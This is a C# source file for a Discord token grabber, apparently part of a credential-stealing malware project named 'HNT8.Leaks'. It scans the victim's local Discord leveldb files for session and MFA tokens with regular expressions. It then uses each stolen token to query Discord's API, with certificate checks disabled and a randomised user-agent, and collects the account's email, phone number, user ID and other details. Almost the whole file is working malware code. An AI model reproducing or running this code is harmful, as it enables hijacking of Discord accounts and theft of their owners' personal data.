using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;
using System.Net;
using Newtonsoft.Json.Linq;
using HNT8.Leaks.Discord.Structures;

namespace HNT8.Leaks.Discord
{
    public static class DiscordGrabber
    {
        // Returns all information on every token found on the local db and converts it into a DiscordInfo object
        public static List<DiscordInfo> GetAccounts()
        {
            List<DiscordInfo> accounts = new List<DiscordInfo>();

            foreach (string token in GetTokens())
            {
                WebClient client = new WebClient();
                client.Headers.Add($"authorization", token);
                client.Headers.Add("user-agent", Misc.RandomString(60));
                ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
                string json = client.DownloadString($"https://discordapp.com/api/v6/users/@me");
                var obj = JObject.Parse(json);

                DiscordInfo account = new DiscordInfo
                {
                    Username = obj["username"].ToString(),
                    UserID = obj["id"].ToString(),
                    Email = obj["email"].ToString(),
                    Phone = obj["phone"].ToString(),
                    AvatarLink = $"https://cdn.discordapp.com/avatars/{obj["id"].ToString()}/{obj["avatar"].ToString()}.png",
                    Discriminator = obj["discriminator"].ToString(),
                    Bio = obj["bio"].ToString(),
                    Locale = obj["locale"].ToString(),
                    Token = token
                };
                accounts.Add(account);
            }

            return accounts;
        }

        // Gets all tokens from discord's local db
        private static List<string> GetTokens()
        {
            List<string> tokens = new List<string>();
            DirectoryInfo folder = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Roaming\Discord\Local Storage\leveldb");

            foreach (var file in folder.GetFiles(false ? "*.log" : "*.ldb"))
            {
                string readfile = file.OpenText().ReadToEnd();

                foreach (Match match in Regex.Matches(readfile, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                    tokens.Add(match.Value + "\n");

                foreach (Match match in Regex.Matches(readfile, @"mfa\.[\w-]{84}"))
                    tokens.Add(match.Value + "\n");
            }

            return tokens;
        }
    }
}
